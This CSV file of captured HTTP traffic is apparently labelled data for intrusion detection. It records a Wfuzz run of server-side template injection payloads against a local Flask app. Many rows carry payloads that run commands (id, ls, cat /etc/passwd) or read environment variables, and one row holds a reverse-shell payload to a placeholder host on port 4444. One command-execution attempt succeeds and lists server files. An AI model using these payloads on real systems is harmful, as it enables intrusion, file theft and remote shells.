attack_tag,dst_ip,dst_port,req_body,req_header_Accept,req_header_Content_Type,req_header_Host,req_header_User_Agent,req_method,req_url,res_body,res_header_Connection,res_header_Content_Length,res_header_Content_Type,res_header_Date,res_header_Response_Code,res_header_Server,src_ip,src_port
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{4*4}}[[5*5]],<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33884
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{7*'7'}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33890
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=@(1+2),"<h2>Hey,  </h2> ",close,16,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33904
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{%20''.__class__.__mro__[2].__subclasses__()%20}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33920
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={php}echo%20`id`;{/php},"<h2>Hey, {php}echo id{php}</h2> ",close,32,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33924
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.cache.util.os.system(""id"")}","<h2>Hey, {self.template.module.cache.util.os.systemid}</h2> ",close,60,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33940
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.util.os.system(""id"")}","<h2>Hey, {self.module.runtime.util.os.systemid}</h2> ",close,53,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33946
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}${self.module.cache.util.os.system(""id"")}","<h2>Hey, {org.apache.commons.io.tils.totringjava.lang.untime.getuntime.execjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.concatjava.lang.haracter.totring.getnputtream}{self.module.cache.util.os.systemid}</h2> ",close,619,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33956
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=${T(java.lang.Runtime).getRuntime().exec('cat%20etc/passwd')},"<h2>Hey, {java.lang.untime.getuntime.execcat etcpasswd}</h2> ",close,61,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33968
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=${T(java.lang.System).getenv()},"<h2>Hey, {java.lang.ystem.getenv}</h2> ",close,39,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33976
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={%%20for%20x%20in%20().__class__.__base__.__subclasses__()%20%}{%%20if%20""warning""%20in%20x.__name__%20%}{{x()._module.__builtins__['__import__']('os').popen(""python3%20-c%20'import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""ip\"",4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/cat\"",%20\""flag.txt\""]);'"").read().zfill(417)}}{%endif%}{%%20endfor%20%}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:18 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33986
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var%20x=new%20java.lang.ProcessBuilder;%20x.command(\\\""uname\\\"",\\\""-a\\\"");%20org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,33998
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var%20x=new%20java.lang.ProcessBuilder;%20x.command(\\\""netstat\\\"");%20org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"")}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34006
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""var%20x=new%20java.lang.ProcessBuilder;%20x.command(\\\""whoami\\\"");%20x.start()\"")}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34010
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\""new%20java.lang.String('xxx')\"")}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34022
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}},"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34024
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{request.__class__}},"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34038
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{request|attr(""__class__"")}}","<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34042
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{request|attr([""__"",""class"",""__""]|join)}}","<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34046
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{request|attr([""_""*2,""class"",""_""*2]|join)}}","<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34062
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34066
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{['cat$IFS/etc/passwd']|filter('system')}},"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34080
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{['cat\x20/etc/passwd']|filter('system')}},"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34092
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={$smarty.version},"<h2>Hey, {smarty.version}</h2> ",close,31,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34106
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{['id']|filter('system')}},"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34118
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={%%20for%20x%20in%20().__class__.__base__.__subclasses__()%20%}{%%20if%20""warning""%20in%20x.__name__%20%}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34134
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{config.__class__.__init__.__globals__['os'].popen('ls').read()}},"<h2>Hey, DVWA-master.zip lfi log.txt wfuzz_all_attack wfuzz_bad_chars wfuzz_sql wfuzz_ssti.pcap wfuzz_xml wfuzz_xss </h2> ",close,122,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34136
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{''.__class__.mro()[1].__subclasses__()[396]('cat%20flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34142
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{%20config.items()[4][1].__class__.__mro__[2].__subclasses__()[40](""/etc/passwd"").read()%20}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34150
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{%20''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()%20}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34164
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{app.request.query.filter(0,0,1024,{'options':'system'})}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34166
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${""freemarker.template.utility.Execute""?new()(""id"")}","<h2>Hey, {freemarker.template.utility.xecutenewid}</h2> ",close,56,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34178
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=[,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34180
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=<,"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34188
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=<%=%20File.open('/etc/passwd').read%20%>,"<h2>Hey,  ile.openetcpasswd.read </h2> ",close,39,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34192
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{self}},"<h2>Hey, &lt;TemplateReference None&gt;</h2> ",close,45,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34202
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{%20request%20}},"<h2>Hey, &lt;Request &#39;http://192.168.1.40:5000/users?username=%7B%7B%20request%20%7D%7D&#39; [GET]&gt;</h2> ",close,112,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34208
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{'a'.toUpperCase()}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34214
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{''.class.mro()[1].subclasses()}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34222
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={%%20for%20key,%20value%20in%20config.iteritems()%20%}<dt>{{%20key|e%20}}</dt><dd>{{%20value|e%20}}</dd>{%%20endfor%20%}","<h2>Hey, { for key value in config.iteritems }dtdtdddd{ endfor }</h2> ",close,70,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34224
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{%20[].class.base.subclasses()%20}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34232
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{config.items()}},"<h2>Hey, &lt;built-in method items of Config object at 0x7f55446d9f80&gt;</h2> ",close,79,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34238
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username={{app.request.server.all|join(',')}}",<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34252
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{dump(app)}},"<h2>Hey, </h2> ",close,15,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34262
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=,<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34270
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=${{7*7}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34276
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=${3*3},"<h2>Hey, {}</h2> ",close,17,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34290
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username={{7*7}},<!doctype html> <html lang=en> <title>500 Internal Server Error</title> <h1>Internal Server Error</h1> <p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p> ,close,265,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",500,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34304
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=<%=%207%20*%207%20%>,"<h2>Hey,     </h2> ",close,19,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34312
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.cache.compat.inspect.os.system(""id"")}","<h2>Hey, {self.module.cache.compat.inspect.os.systemid}</h2> ",close,61,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34314
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=${self.__init__.__globals__['util'].os.system('id')},"<h2>Hey, {self.init.globalsutil.os.systemid}</h2> ",close,50,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34326
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template.module.runtime.util.os.system(""id"")}","<h2>Hey, {self.template.module.runtime.util.os.systemid}</h2> ",close,62,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34328
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.filters.compat.inspect.os.system(""id"")}","<h2>Hey, {self.module.filters.compat.inspect.os.systemid}</h2> ",close,63,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34334
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.exceptions.util.os.system(""id"")}","<h2>Hey, {self.module.runtime.exceptions.util.os.systemid}</h2> ",close,64,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34336
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.util.compat.inspect.os.system(""id"")}","<h2>Hey, {self.module.runtime.util.compat.inspect.os.systemid}</h2> ",close,68,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34340
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.template._mmarker.module.cache.util.os.system(""id"")}","<h2>Hey, {self.template.mmarker.module.cache.util.os.systemid}</h2> ",close,68,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34356
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.cache.util.compat.inspect.os.system(""id"")}","<h2>Hey, {self.module.cache.util.compat.inspect.os.systemid}</h2> ",close,66,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34358
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,"http://192.168.1.40:5000/users?username=${self.module.runtime.compat.inspect.os.system(""id"")}","<h2>Hey, {self.module.runtime.compat.inspect.os.systemid}</h2> ",close,63,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34366
ssti,192.168.1.40,5000,,*/*,application/x-www-form-urlencoded,192.168.1.40:5000,Wfuzz/3.1.0,GET,http://192.168.1.40:5000/users?username=${self.template.__init__.__globals__['os'].system('id')},"<h2>Hey, {self.template.init.globalsos.systemid}</h2> ",close,54,text/html; charset=utf-8,"Tue, 28 Feb 2023 14:39:19 GMT",200,Werkzeug/2.2.2 Python/3.10.6,192.168.1.37,34368
